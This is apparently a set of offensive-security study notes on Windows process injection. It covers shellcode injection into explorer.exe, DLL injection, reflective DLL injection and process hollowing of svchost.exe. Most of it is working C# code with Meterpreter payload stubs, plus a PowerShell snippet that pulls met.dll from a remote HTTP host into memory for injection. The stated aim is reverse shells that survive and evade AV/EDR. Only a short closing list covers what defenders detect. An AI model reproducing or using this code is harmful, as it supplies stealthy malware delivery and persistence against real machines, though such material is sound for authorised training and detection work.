Problem with a basic shellcode runner:
```
┌─────────────────────────────────────────┐
│  Word.exe / PowerShell runs shellcode   │
│  → User closes the application          │
│  → Shell dies immediately               │
│                                         │
│  AV/EDR detects that Word.exe           │
│  is making outbound network connections │
│  → Blocks or kills the process          │
└─────────────────────────────────────────┘
```
The solution: move the payload into a different, more trusted process so it survives and blends in.

Key Concepts Before Starting
Process vs Thread
```
PROCESS
└── Virtual memory space (isolated per process)
    └── THREAD 1  ← executes actual code, has its own stack
    └── THREAD 2
    └── THREAD N
```

Integrity Levels (critical for injection)
```
SYSTEM  ←  highest (svchost.exe default)
  │
High    ←  admin processes
  │
Medium  ←  standard user processes (explorer.exe, notepad.exe)
  │
Low     ←  sandboxed apps (browsers)

RULE: You can only inject INTO processes at the
      SAME or LOWER integrity level than your own.
```

Technique 1: Process Injection (Shellcode Injection)
The 4 Required APIs
```
OpenProcess        → Open a handle to the target process
VirtualAllocEx     → Allocate memory INSIDE the remote process
WriteProcessMemory → Copy shellcode INTO that remote memory
CreateRemoteThread → Create a thread that runs the shellcode
```

Why explorer.exe?
```
✅ Always running during the user session
✅ Never exits until the user logs off
✅ Runs at Medium Integrity → accessible without admin
✅ Trusted and familiar process name
```

Step-by-step flow
```
Our process (injector)              explorer.exe
       │                                 │
       │─── OpenProcess(pid=4804) ──────►│
       │◄── hProcess handle ─────────────│
       │                                 │
       │─── VirtualAllocEx ─────────────►│
       │    (size=0x1000,                │
       │     type=MEM_COMMIT|RESERVE,    │  [4KB block created]
       │     prot=EXECUTE_READWRITE)     │
       │◄── addr (address in explorer) ──│
       │                                 │
       │─── WriteProcessMemory ─────────►│
       │    (shellcode bytes)            │  [shellcode copied]
       │                                 │
       │─── CreateRemoteThread(addr) ───►│
       │                                 │  [new thread runs shellcode]
       │                                 │  ← reverse shell established
```


The C# code

```
// Import the 4 required Win32 APIs
[DllImport("kernel32.dll")]
static extern IntPtr OpenProcess(uint access, bool inherit, int pid);

[DllImport("kernel32.dll")]
static extern IntPtr VirtualAllocEx(IntPtr hProc, IntPtr addr, 
                                     uint size, uint type, uint prot);

[DllImport("kernel32.dll")]
static extern bool WriteProcessMemory(IntPtr hProc, IntPtr baseAddr,
                                       byte[] buf, Int32 size, out IntPtr written);

[DllImport("kernel32.dll")]
static extern IntPtr CreateRemoteThread(IntPtr hProc, IntPtr attrs,
                                         uint stack, IntPtr start,
                                         IntPtr param, uint flags, IntPtr id);

static void Main(string[] args)
{
    // 1. Get a handle to explorer.exe
    IntPtr hProcess = OpenProcess(0x001F0FFF, false, 4804);
    //                            ↑ PROCESS_ALL_ACCESS

    // 2. Allocate executable memory in explorer.exe
    IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero,
                                  0x1000,  // 4096 bytes
                                  0x3000,  // MEM_COMMIT | MEM_RESERVE
                                  0x40);   // PAGE_EXECUTE_READWRITE

    // 3. Copy the shellcode into that memory
    byte[] buf = new byte[] { 0xfc, 0x48, 0x83 ... }; // Meterpreter payload
    IntPtr outSize;
    WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);

    // 4. Create a thread to execute it
    IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0,
                                         addr, IntPtr.Zero, 0, IntPtr.Zero);
}
```

Technique 2: DLL Injection
Key difference from shellcode injection
```
Shellcode Injection → injects raw BYTES directly
DLL Injection       → injects an entire DLL FILE
```

The clever trick: abusing DllMain

Every DLL has a DllMain function that Windows calls automatically when the DLL is loaded. If shellcode is placed inside DllMain, it runs the moment LoadLibrary loads the DLL.
```
// Inside the malicious DLL (C/C++)
BOOL DllMain(HMODULE hModule, DWORD reason, LPVOID reserved)
{
    switch(reason)
    {
        case DLL_PROCESS_ATTACH:
            // ← SHELLCODE EXECUTES HERE automatically on load
            break;
    }
    return TRUE;
}
```

The challenge: LoadLibrary only works locally

LoadLibrary cannot be called directly on a remote process. The workaround is to trick the remote process into calling it itself by passing LoadLibraryA as the start address of a new remote thread, and the DLL path as its argument.

Full DLL Injection flow

```
Attacker machine                   Victim (explorer.exe)
      │                                     │
      │  1. Generate met.dll with msfvenom  │
      │  2. Host it on HTTP server          │
      │                                     │
      │─── Download met.dll to disk ───────►│
      │                                     │
      │─── VirtualAllocEx ─────────────────►│
      │    (space for the DLL path string)  │
      │                                     │
      │─── WriteProcessMemory ─────────────►│
      │    ("C:\Users\...\met.dll")         │
      │                                     │
      │  Resolve address of LoadLibraryA    │
      │  from kernel32.dll                  │
      │                                     │
      │─── CreateRemoteThread( ────────────►│
      │       start = LoadLibraryA,         │
      │       arg   = path to met.dll )     │
      │                                     │  LoadLibraryA("met.dll")
      │                                     │  → calls DllMain
      │                                     │  → shellcode executes
      │◄────────────────────────────────────│  reverse shell!
```

The key code addition
```
// Resolve LoadLibraryA address in our process
// (same address in all processes due to Windows DLL loading)
IntPtr loadLib = GetProcAddress(
    GetModuleHandle("kernel32.dll"), 
    "LoadLibraryA"
);

// Make explorer.exe call LoadLibraryA("path\to\met.dll")
IntPtr hThread = CreateRemoteThread(
    hProcess, IntPtr.Zero, 0,
    loadLib,  // ← start function = LoadLibraryA
    addr,     // ← argument = path to our DLL
    0, IntPtr.Zero
);
```

Critical limitations
❌ DLL must be unmanaged (C/C++), not C#
❌ The DLL file must exist on disk
❌ Visible in Process Explorer's DLL list
❌ Antivirus can scan the DLL file on disk

Technique 3: Reflective DLL Injection
Problem it solves

Standard DLL Injection requires the DLL to be on disk. Reflective DLL Injection maps the DLL directly into memory by manually parsing its PE format, completely bypassing LoadLibrary and disk writes.

How it works conceptually
```
Standard LoadLibrary:          Reflective Injection:
  Read DLL from disk     vs      DLL already in memory as byte[]
  Map into memory                Parse PE format manually
  Register with OS               Map sections into memory
  Call DllMain                   Call shellcode directly
  ↓                              ↓
  Visible everywhere             Invisible to Process Explorer
```

Usage with Invoke-ReflectivePEInjection
```
# 1. Download DLL directly into memory as byte array (never touches disk)
$bytes = (New-Object System.Net.WebClient).DownloadData(
    'http://192.168.119.120/met.dll'
)

# 2. Get explorer.exe PID
$procid = (Get-Process -Name explorer).Id

# 3. Import the injection script
Import-Module C:\Tools\Invoke-ReflectivePEInjection.ps1

# 4. Inject the DLL from memory into explorer
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
```

Technique 4: Process Hollowing (Most Sophisticated)
The unique problem it solves
```
svchost.exe is perfect for hiding because:
✅ Always running
✅ Normally makes network connections (less suspicious)
✅ Trusted Windows system process

BUT:
❌ Running svchost.exe instances are SYSTEM integrity
   → Can't inject from Medium integrity
❌ Launching svchost.exe manually → it terminates immediately
   (needs to be launched by services.exe)
```

The solution: hollow before it runs
1. Create svchost.exe SUSPENDED → exists but executes nothing
2. Find where its code starts (EntryPoint)
3. Overwrite that code with our shellcode
4. Resume execution → runs OUR code, looks like svchost.exe

Detailed step-by-step
Step 1 — Create suspended svchost.exe
```
STARTUPINFO si = new STARTUPINFO();
PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

CreateProcess(
    null,
    "C:\\Windows\\System32\\svchost.exe",
    IntPtr.Zero, IntPtr.Zero,
    false,
    0x4,         // ← CREATE_SUSPENDED flag
    IntPtr.Zero,
    null,
    ref si,
    out pi       // ← contains hProcess and hThread
);
// svchost.exe now exists in memory but is frozen
```

Step 2 — Find the EntryPoint (where code starts)

This is the most complex part. Due to ASLR (Address Space Layout Randomization), the memory address changes every time, so we must calculate it dynamically.
```
ZwQueryInformationProcess(hProcess, ProcessBasicInformation)
         ↓
    PEB address (Process Environment Block)
         ↓
ReadProcessMemory(PEB + 0x10)
         ↓
    svchost.exe base address in memory
         ↓
ReadProcessMemory(base, 0x200 bytes)
         ↓
    Raw PE header bytes
         ↓
Parse PE header:
  data[0x3C] = e_lfanew         (offset to PE signature)
  data[e_lfanew + 0x28] = RVA   (offset to EntryPoint)
         ↓
EntryPoint address = base + RVA
```

PE Header layout (memory map)
```
svchost.exe memory:
┌──────────────────────────────────────────────┐
│ base + 0x00:  4D 5A  ("MZ" magic bytes)      │
│ base + 0x3C:  e_lfanew → points to PE header │
│                                              │
│ base + 0x80:  50 45  ("PE" signature)        │← PE header starts here
│ base + 0xA8:  EntryPoint RVA                 │← offset to code start
└──────────────────────────────────────────────┘

Real EntryPoint = base address + EntryPoint RVA
```

Step 3 — Overwrite EntryPoint with shellcode
```
byte[] buf = new byte[] { 0xfc, 0x48, 0x83 ... }; // Meterpreter payload

// Overwrite svchost.exe's original code with our shellcode
WriteProcessMemory(hProcess, addressOfEntryPoint, 
                   buf, buf.Length, out nRead);
```
Step 4 — Resume the suspended thread
```
// The thread already exists (created by CreateProcess)
// We just need to let it run — it will now execute our shellcode
ResumeThread(pi.hThread);
// svchost.exe "starts" but runs Meterpreter instead
```

Full Process Hollowing flow
```
Our process                        New svchost.exe
     │                                   │
     │── CreateProcess(SUSPENDED) ──────►│ [frozen, waiting]
     │◄── hProcess, hThread ─────────────│
     │                                   │
     │── ZwQueryInformationProcess ──────►│
     │◄── PEB address ───────────────────│
     │                                   │
     │── ReadProcessMemory(PEB+0x10) ───►│
     │◄── svchost base address ──────────│
     │                                   │
     │── ReadProcessMemory(base, 0x200) ►│
     │◄── PE header bytes ───────────────│
     │                                   │
     │  Parse locally:                   │
     │  EntryPoint = base + RVA          │
     │                                   │
     │── WriteProcessMemory(EntryPoint) ─►│ [shellcode replaces code]
     │                                   │
     │── ResumeThread(hThread) ──────────►│ [svchost.exe "runs"]
     │                                   │ [but executes our shellcode]
     │                                   │ ← reverse shell from svchost!
```

Defensive Perspective: What EDR Tools Look For
🔍 CreateRemoteThread called from unexpected parent processes
🔍 VirtualAllocEx with PAGE_EXECUTE_READWRITE (RWX) permissions
🔍 WriteProcessMemory between unrelated processes
🔍 svchost.exe spawned by anything other than services.exe
🔍 Processes created with CREATE_SUSPENDED then quickly resumed
🔍 Network connections originating from explorer.exe or Word
🔍 PE headers found in non-standard memory regions
🔍 DLLs loaded without a corresponding file path on disk
